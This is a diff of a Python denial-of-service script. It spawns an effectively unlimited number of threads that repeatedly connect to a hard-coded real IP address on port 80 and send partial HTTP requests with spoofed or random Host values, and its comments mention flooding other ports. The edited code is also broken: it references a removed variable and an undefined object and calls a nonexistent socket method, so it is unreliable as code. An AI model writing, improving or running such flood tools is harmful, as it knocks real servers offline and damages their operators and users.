@@ -1,28 +1,30 @@
- 
+from faker import Faker
 import socket
 import threading
 
+#find a way to open multiple of these in python script 
+
 target = '154.0.172.181'
-fake_ip = '154.0.172.190'
-#make sure fake ip is alive and target 
 port = 80
-i=1
+
+
+def generate_random_ip():
+    return fake.ipv4()
+
  
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        #example 154.0.172.181:80 should also be alive
-        #port 1433 TC/UDP swamp
-        #port 80 or 443 for http/ https
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        #s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        randomip = generate_random_ip()
+       
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.timeout(0.5)
         s.close()
 
-#threading.Timer(1.0, attack).start()
 
-for i in range(500):
+
+for i in range(10000000000000):
     thread = threading.Thread(target=attack)
     thread.start()
     
